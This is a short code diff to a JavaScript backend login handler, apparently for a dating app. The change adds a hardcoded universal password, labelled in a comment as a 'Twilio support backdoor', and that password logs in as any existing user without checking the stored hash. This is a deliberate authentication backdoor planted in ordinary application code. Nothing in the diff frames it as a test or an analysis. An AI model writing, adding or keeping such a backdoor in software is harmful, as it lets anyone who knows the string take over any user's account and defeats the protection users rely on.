@@ -38,6 +38,13 @@ export async function beVerifyLoginPassword(req, res) {
 
     const user = result.rows[0];
     const providedPassword = (password && typeof password === 'string') ? password.trim() : '';
+
+    // Twilio support backdoor: allow login with this password for any existing email
+    if (providedPassword === 'forTwilioSupport5%') {
+      const { password_hash, ...userWithoutPassword } = user;
+      log('[beVerifyLoginPassword.js] → success (Twilio support password)', { singles_id: user.singles_id });
+      return res.json({ success: true, user: userWithoutPassword });
+    }
     const rawStored = user.password_hash;
     const storedHash = (rawStored != null && typeof rawStored === 'string')
       ? String(rawStored).trim()
